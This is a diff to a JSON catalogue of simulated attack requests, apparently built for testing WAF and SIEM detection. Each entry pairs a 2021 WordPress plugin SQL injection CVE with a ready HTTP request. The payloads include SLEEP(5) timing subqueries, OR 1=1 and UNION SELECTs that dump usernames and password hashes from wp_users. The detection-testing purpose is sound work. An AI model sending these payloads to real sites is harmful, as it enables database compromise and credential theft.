@@ -414269,6 +414269,554 @@
     "visible": true
   },
   {
+    "name": "CVE-2021-24726 - WP Simple Booking Calendar SQL Injection",
+    "displayName": "CVE-2021-24726 - WP Simple Booking Calendar SQL Injection",
+    "description": "The WP Simple Booking Calendar WordPress plugin before 2.0.6 does not escape, validate or sanitise the orderby parameter of its Search Calendars action on the wpsbc-calendars admin page (/wp-admin/admin.php?page=wpsbc-calendars) before using it in a SQL statement, leading to an authenticated SQL injection. The request sends a time-based SLEEP(5) subquery in orderby. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/f85b6033-d7c1-45b7-b3b0-8967f7373bb8 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24726 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=wpsbc-calendars&paged=1&s=MyCal&orderby=name%2C%28SELECT%20%2A%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24726"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24726",
+        "link": "https://wpscan.com/vulnerability/f85b6033-d7c1-45b7-b3b0-8967f7373bb8"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24704 - Orange Form SQL Injection",
+    "displayName": "CVE-2021-24704 - Orange Form SQL Injection",
+    "description": "In the Orange Form WordPress plugin through 1.0, the process_bulk_action() function performs an unprepared SQL query with the unsanitised id[] parameter when deleting entries via the or-form admin page (/wp-admin/admin.php?page=or-form). Lack of CSRF protection makes it exploitable. The request sends an OR 1=1 payload in id[]. No vendor WAF rule found; built from the WPScan PoC (method POST per advisory).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/60843022-fe43-4608-8859-9c9109b35b42 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24704 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin.php?page=or-form&msg=suc HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\npage=or-form&action=delete&id%5B%5D=1+OR+1%3D1--+-&action2=delete\n"
+    },
+    "cves": [
+      "CVE-2021-24704"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-352"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-352",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24704",
+        "link": "https://wpscan.com/vulnerability/60843022-fe43-4608-8859-9c9109b35b42"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24669 - MAZ Loader Preloader Builder SQL Injection",
+    "displayName": "CVE-2021-24669 - MAZ Loader Preloader Builder SQL Injection",
+    "description": "The MAZ Loader - Preloader Builder for WordPress plugin before 1.3.3 does not validate or escape the loader_id attribute of the mzldr shortcode, allowing Contributor+ users to inject SQL that is rendered from stored post content. The request saves a post whose content contains an mzldr shortcode with a UNION SELECT against wp_users in loader_id. No vendor WAF rule found; built from the WPScan advisory. Method inferred POST (payload stored via the post editor); WAF inspects the UNION SELECT in the body.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/b97afbe8-c9ae-40a2-81e5-b1d7a6b31831 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24669 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/post.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\naction=editpost&post_ID=1&_wpnonce=dummy&content=%5Bmzldr+loader_id%3D%221+UNION+SELECT+user_login%2Cuser_pass+FROM+wp_users--+-%22%5D\n"
+    },
+    "cves": [
+      "CVE-2021-24669"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24669",
+        "link": "https://wpscan.com/vulnerability/b97afbe8-c9ae-40a2-81e5-b1d7a6b31831"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24666 - Podlove Podcast Publisher SQL Injection",
+    "displayName": "CVE-2021-24666 - Podlove Podcast Publisher SQL Injection",
+    "description": "The Podlove Podcast Publisher WordPress plugin before 3.5.6 registers the REST route /podlove/v1/social/services/contributor/<id> (Social & Donations module) whose id and category arguments are used unsafely in a SQL statement, allowing unauthenticated SQL injection. The request sends a UNION SELECT against wp_users in the category parameter via the plain-permalink rest_route entry point. No vendor WAF rule found; built from the WPScan PoC and fix commit. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/fb4d7988-60ff-4862-96a1-80b1866336fe (WPScan advisory + PoC)\n- https://github.com/podlove/podlove-publisher/commit/aa8a343a2e2333b34a422f801adee09b020c6d76 (fix commit)\n- https://www.cve.org/CVERecord?id=CVE-2021-24666 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /index.php?rest_route=/podlove/v1/social/services/contributor/1&category=-1+UNION+SELECT+user_login%2Cuser_pass%2Cuser_email+FROM+wp_users--+- HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2021-24666"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24666",
+        "link": "https://wpscan.com/vulnerability/fb4d7988-60ff-4862-96a1-80b1866336fe"
+      },
+      {
+        "title": "poc_github for CVE-2021-24666",
+        "link": "https://github.com/podlove/podlove-publisher/commit/aa8a343a2e2333b34a422f801adee09b020c6d76"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24662 - Game Server Status SQL Injection",
+    "displayName": "CVE-2021-24662 - Game Server Status SQL Injection",
+    "description": "The Game Server Status WordPress plugin through 1.0 does not validate or escape the server_id parameter on the grohsfabian-add-game-servers admin page (/wp-admin/admin.php) before using it in a SQL statement, leading to an authenticated (Admin+) SQL injection. The request sends a time-based SLEEP(5) subquery in server_id. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/8a74a2a0-3d8c-427f-9a83-0160d652c5f0 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24662 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=grohsfabian-add-game-servers&server_id=1+OR+%28SELECT+42+FROM+%28SELECT%28SLEEP%285%29%29%29b%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24662"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24662",
+        "link": "https://wpscan.com/vulnerability/8a74a2a0-3d8c-427f-9a83-0160d652c5f0"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24651 - Poll Maker SQL Injection",
+    "displayName": "CVE-2021-24651 - Poll Maker SQL Injection",
+    "description": "The Poll Maker WordPress plugin before 3.4.2 allows unauthenticated SQL injection via the ays_finish_poll AJAX action (/wp-admin/admin-ajax.php), where the answer[] POST parameter is used unsafely in a SQL statement; the result is blind so a timing attack exfiltrates data. The request sends a time-based SLEEP(5) subquery in answer[]. No vendor WAF rule found; built from the WPScan PoC (POST per jQuery.post in PoC).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/24f933b0-ad57-4ed3-817d-d637256e2fb1 (WPScan advisory + PoC)\n- https://www.cve.org/CVERecord?id=CVE-2021-24651 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\n\naction=ays_finish_poll&ays_finish_poll=dummy&poll_id=1&end_date=&answer%5B%5D=1+AND+%28SELECT+1+FROM+%28SELECT%28SLEEP%285%29%29%29a%29\n"
+    },
+    "cves": [
+      "CVE-2021-24651"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-203"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-203",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24651",
+        "link": "https://wpscan.com/vulnerability/24f933b0-ad57-4ed3-817d-d637256e2fb1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24631 - Unlimited PopUps SQL Injection",
+    "displayName": "CVE-2021-24631 - Unlimited PopUps SQL Injection",
+    "description": "The Unlimited PopUps WordPress plugin through 4.5.3 does not sanitise or escape the did GET parameter on the popup admin page (/wp-admin/admin.php?page=popup&info=del) before using it in a SQL statement, leading to an authenticated (Editor+) SQL injection. The request sends a time-based SLEEP(5) subquery in did. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/9841176d-1d37-4636-9144-0ca42b6f3605 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-unlimited-popups/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24631 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=popup&info=del&did=1+AND+%28SELECT+4420+FROM+%28SELECT%28SLEEP%285%29%29%29yVXX%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24631"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24631",
+        "link": "https://wpscan.com/vulnerability/9841176d-1d37-4636-9144-0ca42b6f3605"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24630 - Schreikasten SQL Injection",
+    "displayName": "CVE-2021-24630 - Schreikasten SQL Injection",
+    "description": "The Schreikasten WordPress plugin through 0.14.18 does not sanitise or escape the id GET parameter in the comments dashboard skmanage page (/wp-admin/edit-comments.php?page=skmanage) before using it in SQL statements, leading to an authenticated (Author+) SQL injection. The request sends a time-based SLEEP(5) subquery in id for the edit/delete action. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/a0787dae-a4b7-4248-9960-aaffabfaeb9f (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-schreikasten/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24630 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/edit-comments.php?page=skmanage&mode=edit&text&paged=1&mode_x=delete_x&id=6+AND+%28SELECT+9304+FROM+%28SELECT%28SLEEP%285%29%29%29ghFg%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24630"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24630",
+        "link": "https://wpscan.com/vulnerability/a0787dae-a4b7-4248-9960-aaffabfaeb9f"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24629 - Post Content XMLRPC SQL Injection",
+    "displayName": "CVE-2021-24629 - Post Content XMLRPC SQL Injection",
+    "description": "The Post Content XMLRPC WordPress plugin through 1.0 does not sanitise or escape multiple GET/POST parameters before using them in SQL statements; the PoC injects the id parameter on the pcx_add_sites admin page (/wp-admin/admin.php?page=pcx_add_sites&mode=add), leading to an authenticated (Admin+) SQL injection. The request sends a time-based SLEEP(5) subquery in id. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/fb42980c-93e5-42d5-a478-c2b348eaea67 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-post-content-xmlrpc/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24629 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=pcx_add_sites&mode=add&id=1+AND+%28SELECT+1+FROM+%28SELECT%28SLEEP%285%29%29%29a%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24629"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24629",
+        "link": "https://wpscan.com/vulnerability/fb42980c-93e5-42d5-a478-c2b348eaea67"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24628 - Wow Forms SQL Injection",
+    "displayName": "CVE-2021-24628 - Wow Forms SQL Injection",
+    "description": "The Wow Forms WordPress plugin (slug mwp-forms) through 3.1.3 does not sanitise or escape the did GET parameter when deleting a form on the mwp-forms admin page (/wp-admin/admin.php?page=mwp-forms&info=del) before using it in a SQL statement, leading to an authenticated (Admin+) SQL injection. The request sends a time-based SLEEP(5) subquery in did. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/d742ab35-4e2d-42a8-bebc-b953b2e10e3c (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-mwp-forms/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24628 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=mwp-forms&info=del&did=1+AND+%28SELECT+9063+FROM+%28SELECT%28SLEEP%285%29%29%29YGWC%29 HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24628"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24628",
+        "link": "https://wpscan.com/vulnerability/d742ab35-4e2d-42a8-bebc-b953b2e10e3c"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24627 - G Auto-Hyperlink SQL Injection",
+    "displayName": "CVE-2021-24627 - G Auto-Hyperlink SQL Injection",
+    "description": "The G Auto-Hyperlink WordPress plugin through 1.0.1 does not sanitise or escape the id GET parameter on the g-auto-hyperlink-edit admin page (/wp-admin/admin.php) before using it in a SQL statement, leading to an authenticated (Admin+) SQL injection. The request sends a UNION SELECT against wp_users in id. No vendor WAF rule found; built from the WPScan PoC. Method inferred GET from the query-string PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/c04ea768-150f-41b8-b08c-78d1ae006bbb (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-g-auto-hyperlink/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24627 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=g-auto-hyperlink-edit&id=-1+UNION+SELECT+CONCAT%28user_login%2C0x3a%2Cuser_pass%29+FROM+wp_users--+- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24627"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24627",
+        "link": "https://wpscan.com/vulnerability/c04ea768-150f-41b8-b08c-78d1ae006bbb"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24626 - Chameleon CSS SQL Injection",
+    "displayName": "CVE-2021-24626 - Chameleon CSS SQL Injection",
+    "description": "The Chameleon CSS WordPress plugin through 1.2 lacks CSRF and capability checks on its AJAX calls; the remove_css action (/wp-admin/admin-ajax.php) does not sanitise or escape the css_id POST parameter before using it in a SQL statement, allowing any authenticated user (Subscriber+) to perform SQL injection. The request sends a time-based SLEEP(5) subquery in css_id. No vendor WAF rule found; built from the WPScan PoC (POST per advisory).\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/06cb6c14-99b8-45b6-be2e-f4dcca8a4165 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-chameleon-css/ (disclosure write-up)\n- https://www.cve.org/CVERecord?id=CVE-2021-24626 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nX-Requested-With: XMLHttpRequest\nCookie: wordpress_logged_in=dummy\n\naction=remove_css&css_id=1+AND+%28SELECT+7806+FROM+%28SELECT%28SLEEP%285%29%29%29CVtK%29\n"
+    },
+    "cves": [
+      "CVE-2021-24626"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 4,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24626",
+        "link": "https://wpscan.com/vulnerability/06cb6c14-99b8-45b6-be2e-f4dcca8a4165"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2021-24625 - SpiderCatalog WordPress Plugin SQL Injection",
     "displayName": "CVE-2021-24625 - SpiderCatalog WordPress Plugin SQL Injection",
     "description": "The SpiderCatalog WordPress plugin through 1.7.3 does not sanitise the 'parent' and 'ordering' parameters on the Categories_Spider_Catalog admin page (task=save) before using them in a SQL statement when adding a category, leading to an authenticated (admin+) SQL injection. The request sends a time-based blind SLEEP(5) payload in the parent parameter. No vendor WAF rule found; built from the WPScan PoC.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/33e4d7c6-fa6f-459f-84b9-732ec40088b8 (WPScan advisory/PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-catalog/ (disclosure)\n- https://www.cve.org/CVERecord?id=CVE-2021-24625 (CVE record)",
@@ -414805,6 +415353,1041 @@
       {
         "title": "poc_wpscan for CVE-2021-24521",
         "link": "https://wpscan.com/vulnerability/eb21ebc5-265c-4378-b2c6-62f6bc2f69cd"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24399 - The Sorter WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24399 - The Sorter WordPress Plugin SQL Injection",
+    "description": "The Sorter WordPress plugin through 1.0 is vulnerable to authenticated SQL injection: the check_order function uses the area_id GET parameter on the /wp-admin/admin.php?page=the_sorter_areas page without sanitisation before it is inserted into a SQL statement. The request sends a time-based blind payload (SLEEP(5)) in area_id. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/f7af0795-f111-4acc-9b1e-63cae5862f8b (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-the-sorter/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=the_sorter_areas&area_id=1%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(5)))a)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24399"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24399",
+        "link": "https://wpscan.com/vulnerability/f7af0795-f111-4acc-9b1e-63cae5862f8b"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24398 - Responsive 3D Slider (Morpheus) WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24398 - Responsive 3D Slider (Morpheus) WordPress Plugin SQL Injection",
+    "description": "The Responsive 3D Slider (Morpheus Slider) WordPress plugin through 1.2 is vulnerable to authenticated time-based SQL injection in the Add new scene functionality: the id POST parameter on /wp-admin/options-general.php?page=morpheus is used unsanitised in a SQL statement, and because it is used twice a SLEEP(5) yields ~10s. The request sends a SLEEP(5) payload in id. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/e6fb2256-0214-4891-b4b7-e4371a1599a5 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-morpheus-slider/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/options-general.php?page=morpheus HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: wordpress_logged_in=dummy\n\noperation=0&title1=New+scene&total=1&id=4%20AND%20(SELECT%204576%20FROM%20(SELECT(SLEEP(5)))QuMl)&submit=Save+Changes\n"
+    },
+    "cves": [
+      "CVE-2021-24398"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24398",
+        "link": "https://wpscan.com/vulnerability/e6fb2256-0214-4891-b4b7-e4371a1599a5"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24397 - MicroCopy WordPress Plugin SQL Injection",
+    "displayName": "CVE-2021-24397 - MicroCopy WordPress Plugin SQL Injection",
+    "description": "The MicroCopy WordPress plugin through 1.1.0 is vulnerable to authenticated SQL injection: the edit functionality issues a GET request on /wp-admin/admin.php?page=microcopy/detail.php&action=edit where the id parameter is used unsanitised in a SQL statement. The request sends a UNION SELECT payload in id. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/2edab2b0-d4fd-4d50-aca0-2a1b7b37c23d (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-microcopy/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=microcopy%2Fdetail.php&action=edit&id=-5617%20UNION%20ALL%20SELECT%201,2,user(),3--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24397"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24397",
+        "link": "https://wpscan.com/vulnerability/2edab2b0-d4fd-4d50-aca0-2a1b7b37c23d"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24396 - GSEOR WordPress SEO Plugin SQL Injection",
+    "displayName": "CVE-2021-24396 - GSEOR WordPress SEO Plugin SQL Injection",
+    "description": "The GSEOR - WordPress SEO Plugin through 1.3 is vulnerable to authenticated time-based SQL injection: the pageid GET parameter on /wp-admin/admin.php?page=gseor.php (with search=1) is used unsanitised in a SQL statement. The request sends a SLEEP(5) payload in pageid. No vendor WAF rule found; built from the WPScan advisory PoC. Admin session cookie is a dummy value.\n\nReferences used to recreate this request:\n- https://wpscan.com/vulnerability/28687291-2369-49e0-8905-dc4359454830 (WPScan advisory + PoC)\n- https://codevigilant.com/disclosure/2021/wp-plugin-gseor/ (disclosure)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-admin/admin.php?page=gseor.php&search=1&pageid=1%20AND%20(SELECT%206449%20FROM%20(SELECT(SLEEP(5)))wwdQ) HTTP/1.1\nHost: {{target_host}}\nCookie: wordpress_logged_in=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2021-24396"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_wpscan for CVE-2021-24396",
+        "link": "https://wpscan.com/vulnerability/28687291-2369-49e0-8905-dc4359454830"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2021-24395 - Embed Youtube Video WordPress Plugin SQL Injection",
